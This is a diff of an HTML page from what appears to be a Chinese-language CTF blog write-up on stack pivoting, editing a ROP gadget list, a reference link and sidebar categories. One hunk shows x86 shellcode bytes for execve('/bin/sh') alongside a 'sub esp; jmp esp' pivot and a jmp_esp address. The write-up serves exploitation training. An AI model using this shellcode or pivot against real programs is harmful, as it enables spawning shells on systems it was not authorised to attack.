@@ -69,7 +69,7 @@
 <p>可以控制sp指针。一般来说，控制栈指针会使用ROP，常见的控制栈指针的gadgets一般是</p>
 </li>
 </ol>
-<div class="highlight"><pre><span></span><span class="nf">pop</span> <span class="no">rsp</span><span class="err">/</span><span class="no">esp</span><span class="p">,</span> <span class="no">ret</span>
+<div class="highlight"><pre><span></span><span class="nf">pop</span> <span class="no">sp</span><span class="p">,</span> <span class="no">ret</span>
 <span class="nf">jmp</span> <span class="no">sp</span>
 <span class="nf">add</span> <span class="no">sp</span>
 <span class="nf">sub</span> <span class="no">sp</span>
@@ -148,7 +148,7 @@
 
 <span class="n">shellcode_x86</span> <span class="o">=</span> <span class="s2">&quot;</span><span class="se">\x31\xc9\xf7\xe1\x51\x68\x2f\x2f\x73</span><span class="s2">&quot;</span>
 <span class="n">shellcode_x86</span> <span class="o">+=</span> <span class="s2">&quot;</span><span class="se">\x68\x68\x2f\x62\x69\x6e\x89\xe3\xb0</span><span class="s2">&quot;</span>
-<span class="n">shellcode_x86</span> <span class="o">+=</span> <span class="s2">&quot;</span><span class="se">\x0b\xcd\x80</span><span class="s2">&quot;</span>
+<span class="n">shellcode_x86</span> <span class="o">+=</span> <span class="s2">&quot;</span><span class="se">\x0b\xcd\x80</span><span class="s2">&quot;</span>   <span class="c1"># execve(&quot;/bin/sh&quot;)</span>
 
 <span class="n">sub_esp_jmp</span> <span class="o">=</span> <span class="n">asm</span><span class="p">(</span><span class="s1">&#39;sub esp, 0x28;jmp esp&#39;</span><span class="p">)</span>
 <span class="n">jmp_esp</span> <span class="o">=</span> <span class="mh">0x08048504</span>
@@ -166,7 +166,7 @@
 </ol>
 <p><img alt="checksec" src="http://shangfute.github.com/images/k64-2017-11-27-20-30-26.png"></p>
 <h2>Ref</h2>
-<p><a href="https://ctf-wiki.github.io/ctf-wiki/pwn/stackoverflow/others.htmlhttps://ctf-wiki.github.io/ctf-wiki/pwn/stackoverflow/others.html">stack pivot</a></p></div>
+<p><a href="https://ctf-wiki.github.io/ctf-wiki/pwn/stackoverflow/others.html">stack pivot</a></p></div>
 	<hr>
 	<h2>Comments</h2>
 <!-- 多说评论框 start -->
@@ -212,19 +212,20 @@ var duoshuoQuery = {short_name:"shangfute"};
 						<h4>Categories</h4>
 						<ul class="list-unstyled my-list-style">
 							<li><a href="http://shangfute.github.com/category/crypto.html">crypto (4)</a></li>
-							<li><a href="http://shangfute.github.com/category/ctf.html">ctf (2)</a></li>
+							<li><a href="http://shangfute.github.com/category/ctf.html">ctf (3)</a></li>
+							<li><a href="http://shangfute.github.com/category/hack.html">hack (1)</a></li>
 							<li><a href="http://shangfute.github.com/category/life.html">life (9)</a></li>
 							<li><a href="http://shangfute.github.com/category/philosophy.html">philosophy (1)</a></li>
 							<li><a href="http://shangfute.github.com/category/programming.html">programming (3)</a></li>
 							<li><a href="http://shangfute.github.com/category/research.html">research (5)</a></li>
-							<li><a href="http://shangfute.github.com/category/web.html">web (2)</a></li>
+							<li><a href="http://shangfute.github.com/category/web.html">web (3)</a></li>
 						</ul>
 					</div>
 					<div class="col-md-3">
 						<h4>Links</h4>
 						<ul class="list-unstyled my-list-style">
-							<li><a href="http://freebuf.com/">Freebuf</a></li>
-							<li><a href="http://litengyao.com">ltyleader</a></li>
+							<li><a href="http://music.shangfute.com/">musics</a></li>
+							<li><a href="http://pictures.shangfute.com">timeline</a></li>
 						</ul>
 					</div>
 				</div>
